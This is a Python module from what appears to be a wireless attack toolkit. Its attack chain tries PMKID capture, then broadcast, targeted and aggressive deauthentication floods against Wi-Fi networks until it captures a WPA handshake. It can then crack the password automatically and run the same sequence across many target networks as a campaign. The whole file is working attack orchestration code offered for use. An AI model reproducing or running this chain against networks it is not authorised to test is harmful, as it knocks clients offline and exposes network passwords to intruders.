"""Persistent attack chain with technique cycling and auto-skip."""

from __future__ import annotations

import logging
import time
from typing import Callable, List, Optional, Tuple

from wifi_launchpad.app.settings import get_settings
from wifi_launchpad.domain.capture import AttackTargetResult, Handshake
from wifi_launchpad.domain.survey import Network, ScanResult
from wifi_launchpad.providers.external.hcx import HCXCaptureProvider
from wifi_launchpad.providers.native.capture.deauth import DeauthConfig, DeauthStrategy
from wifi_launchpad.providers.native.capture.manager import CaptureConfig, CaptureManager
from wifi_launchpad.services.crack_service import CrackService

logger = logging.getLogger(__name__)


def _build_techniques():
    """Build technique list with timeouts from settings."""
    atk = get_settings().attack
    return [
        ("pmkid", "PMKID probe (clientless)", atk.pmkid_timeout),
        ("deauth-broadcast", "Deauth broadcast", atk.deauth_broadcast_timeout),
        ("deauth-targeted", "Deauth per-client", atk.deauth_targeted_timeout),
        ("deauth-aggressive", "Deauth aggressive", atk.deauth_aggressive_timeout),
    ]


class AttackChain:
    """Persistent technique chain: PMKID → deauth strategies until captured."""

    def __init__(
        self,
        monitor_interface: str,
        injection_interface: Optional[str] = None,
        hcx_provider: Optional[HCXCaptureProvider] = None,
        auto_crack: bool = False,
        on_status: Optional[Callable[[str], None]] = None,
        recon_lookup: Optional[dict] = None,
    ):
        self.monitor_interface = monitor_interface
        self.injection_interface = injection_interface or monitor_interface
        self.hcx_provider = hcx_provider
        self.auto_crack = auto_crack
        self.on_status = on_status or (lambda msg: None)
        self.recon_lookup = recon_lookup or {}
        self._skip_requested = False

    def request_skip(self):
        """Signal the chain to skip the current target."""
        self._skip_requested = True

    # ── Single target ────────────────────────────────────────────────────

    def attack_target(
        self,
        network: Network,
        scan_results: ScanResult,
    ) -> AttackTargetResult:
        """Run full technique chain on a single target until captured or exhausted."""

        self._skip_requested = False
        result = AttackTargetResult(
            network_ssid=network.ssid,
            network_bssid=network.bssid,
            captured=False,
            skipped=False,
        )
        started = time.time()

        # Use recon intel for pre-identified clients (sorted by traffic volume)
        intel = self.recon_lookup.get(network.bssid)
        if intel and intel.clients:
            # Sort by packet count descending — most active client first
            sorted_clients = sorted(intel.clients, key=lambda c: c.packets_sent, reverse=True)
            client_macs = [c.mac_address for c in sorted_clients]
            self.on_status(
                f"  [dim]Recon: {len(client_macs)} known client(s), "
                f"best: {client_macs[0]} ({sorted_clients[0].packets_sent} pkts)[/dim]"
            )
        else:
            clients = scan_results.get_associated_clients(network.bssid)
            client_macs = [c.mac_address for c in clients] if clients else []

        eapol_total = 0
        pmkid_tried = False
        pmkid_success = False

        for i, (tech_id, tech_label, tech_timeout) in enumerate(_build_techniques()):
            if self._skip_requested:
                result.skipped = True
                result.skip_reason = "user-skip"
                break

            # Check auto-skip conditions before each round
            should_skip, reason = self._should_skip(
                round_num=i,
                eapol_count=eapol_total,
                client_count=len(client_macs),
                pmkid_tried=pmkid_tried,
                pmkid_success=pmkid_success,
            )
            if should_skip:
                result.skipped = True
                result.skip_reason = reason
                break

            self.on_status(f"  [{i + 1}/{len(_build_techniques())}] {tech_label} ({tech_timeout}s)")
            result.techniques_tried.append(tech_id)

            if tech_id == "pmkid":
                success, handshake, hash_file = self._try_pmkid(
                    network, tech_timeout
                )
                pmkid_tried = True
                if success and handshake:
                    pmkid_success = True
                    result.captured = True
                    result.handshake = handshake
                    result.hash_file = hash_file
                    self.on_status(f"      PMKID captured!")
                    break
                self.on_status(f"      no PMKID")

            elif tech_id.startswith("deauth-"):
                strategy = {
                    "deauth-broadcast": DeauthStrategy.BROADCAST,
                    "deauth-targeted": DeauthStrategy.TARGETED,
                    "deauth-aggressive": DeauthStrategy.AGGRESSIVE,
                }.get(tech_id, DeauthStrategy.BROADCAST)

                success, handshake, eapol_count = self._try_deauth(
                    network, client_macs, strategy, tech_timeout
                )
                eapol_total += eapol_count

                if success and handshake:
                    result.captured = True
                    result.handshake = handshake
                    self.on_status(
                        f"      {eapol_count} EAPOL packets — CAPTURED!"
                    )
                    break

                status_msg = f"      {eapol_count} EAPOL packets" if eapol_count else "      no EAPOL"
                self.on_status(status_msg)

        result.total_time = time.time() - started
        result.eapol_packets_seen = eapol_total

        # Auto-crack if captured
        if result.captured and self.auto_crack:
            result.crack_result = self._try_crack(result)

        return result

    # ── Multi-target campaign ───────────────────────────────────────────
    def run_campaign(
        self,
        targets: List[Network],
        scan_results: ScanResult,
    ) -> List[AttackTargetResult]:
        """Run attack_target() on each target sequentially."""

        results = []
        total = len(targets)

        for i, target in enumerate(targets, 1):
            n_clients = len(scan_results.get_associated_clients(target.bssid))
            client_info = f", {n_clients} clients" if n_clients else ""
            header = (
                f"\n{'=' * 55}\n Target {i}/{total}: {target.ssid} "
                f"(ch {target.channel}, {target.signal_strength} dBm{client_info})\n{'=' * 55}"
            )
            self.on_status(header)

            self._cleanup_stale_processes()
            result = self.attack_target(target, scan_results)
            results.append(result)
            self._cleanup_stale_processes()

            if result.captured:
                quality = result.handshake.quality_score if result.handshake else 0
                method = result.handshake.capture_method if result.handshake else "?"
                self.on_status(
                    f"  >> CAPTURED ({method}, quality: {quality:.0f}/100, {result.total_time:.0f}s)"
                )
                if result.crack_result and result.crack_result.cracked:
                    self.on_status(
                        f"  >> CRACKED: {result.crack_result.password} ({result.crack_result.crack_time:.1f}s)"
                    )
                elif result.crack_result:
                    self.on_status(f"  >> Not cracked ({result.crack_result.method})")
            elif result.skipped:
                self.on_status(f"  >> SKIPPED: {result.skip_reason}")
            else:
                self.on_status(f"  >> FAILED after {result.total_time:.0f}s")

        return results

    # ── Technique implementations ───────────────────────────────────────

    def _try_pmkid(
        self, network: Network, timeout: int
    ) -> Tuple[bool, Optional[Handshake], Optional[str]]:
        """Attempt PMKID capture via hcxdumptool."""

        if not self.hcx_provider or not HCXCaptureProvider.is_available():
            return False, None, None

        try:
            return self.hcx_provider.capture_pmkid(
                target_channel=network.channel,
                capture_timeout=timeout,
                target_bssid=network.bssid,
                target_ssid=network.ssid,
            )
        except Exception as exc:
            logger.error("PMKID capture error: %s", exc)
            return False, None, None

    def _try_deauth(
        self,
        network: Network,
        client_macs: List[str],
        strategy: DeauthStrategy,
        timeout: int,
    ) -> Tuple[bool, Optional[Handshake], int]:
        """Attempt deauth + handshake capture with native airodump/aireplay."""

        if strategy == DeauthStrategy.TARGETED and not client_macs:
            strategy = DeauthStrategy.BROADCAST
        burst_specs = {
            DeauthStrategy.AGGRESSIVE: (15, 2.0),
            DeauthStrategy.TARGETED: (8, 4.0),
        }
        burst_count, burst_interval = burst_specs.get(strategy, (5, 5.0))
        deauth_config = DeauthConfig(
            strategy=strategy, burst_count=burst_count,
            packet_count=10, burst_interval=burst_interval,
        )

        config = CaptureConfig(
            target_bssid=network.bssid,
            target_channel=network.channel,
            target_ssid=network.ssid,
            capture_timeout=timeout,
            deauth_count=deauth_config.burst_count,
            deauth_interval=int(deauth_config.burst_interval),
            deauth_client=client_macs[0] if client_macs and strategy == DeauthStrategy.TARGETED else None,
            min_quality_score=30.0,
        )

        manager = CaptureManager(self.injection_interface, self.injection_interface)

        try:
            success, handshake = manager.capture_handshake(config)
        except Exception as exc:
            logger.error("Deauth capture error: %s", exc)
            return False, None, 0

        eapol_count = handshake.eapol_packets if handshake else 0
        return success, handshake if success else None, eapol_count

    def _try_crack(self, result: AttackTargetResult):
        """Attempt to crack a captured handshake."""

        try:
            service = CrackService()
            if result.hash_file:
                return service.crack_hash(result.hash_file, timeout=300)
            elif result.handshake:
                return service.crack_handshake(result.handshake, timeout=300)
        except Exception as exc:
            logger.error("Auto-crack error: %s", exc)
        return None

    @staticmethod
    def _cleanup_stale_processes() -> None:
        """Kill leftover capture/deauth processes from prior targets."""
        import subprocess
        for proc in ("airodump-ng", "aireplay-ng", "hcxdumptool"):
            try:
                subprocess.run(["sudo", "pkill", "-9", proc], capture_output=True, timeout=3)
            except Exception:
                pass

    @staticmethod
    def _should_skip(
        round_num: int, eapol_count: int, client_count: int,
        pmkid_tried: bool, pmkid_success: bool,
    ) -> Tuple[bool, str]:
        """Decide whether to skip the current target."""
        if round_num >= len(_build_techniques()):
            return True, "exhausted"
        if round_num >= 3 and eapol_count == 0:
            return True, "pmf-likely"
        return False, ""
